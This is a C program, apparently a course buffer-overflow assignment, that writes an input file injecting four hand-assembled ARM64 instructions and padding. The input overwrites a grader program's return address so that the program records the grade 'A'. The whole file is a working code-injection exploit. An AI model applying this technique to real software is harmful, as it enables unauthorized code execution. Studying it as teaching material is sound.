/**********************************************************************/
/* Author: Chimwemwe Chinkuyu                                         */
/* file: createdataA.c                                                */
/**********************************************************************/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include "miniassembler.h"


/* Takes in no input and writes "Chimwemwe", by 1 null byte,
 * then four instructions that set grade = 'A' in grader.c, then
 * 23 null bytes for padding and one byte overflow in buf[].
 * Returns 0. */
int main(void) {
    FILE *psFile;
    unsigned int ulInstruction;
    int i = 0;

    /* Open file dataA to write data into */
    psFile = fopen("dataA", "w");

    /* Write my name (Chimwemwe) to the file dataA followed
     * by a null byte */
    fprintf(psFile, "Chimwemwe");
    putc(0x00, psFile);

    /* Write the instruction that moves 'A' into the x0 register
     * in machine language to dataA */
    ulInstruction = MiniAssembler_mov(0, 65);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);

    /* Write the instruction that puts the address of variable [grade]
     * into the x1 register in machine language to dataA */
    ulInstruction = MiniAssembler_adr(1, 0x420000, 0x420066);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);

    /* Write the instruction that stores 'A' in the [grade] variable
     * in machine language to dataA */
    ulInstruction = MiniAssembler_strb(0, 1);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);

    /* Write the instruction that branches to the instruction in main
     * that prints the user's name and grade in machine language to
     * dataA */
    ulInstruction = MiniAssembler_b(0x400864, 0x42006E);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);

    /* Fill up buf[] array and go over one to overwrite getName's
     * return value with 23 null bytes of padding */
    for(; i < 23; i++) {
        putc('\0', psFile);
    }

    /* Close the file */
    fclose(psFile);

    return 0;
}
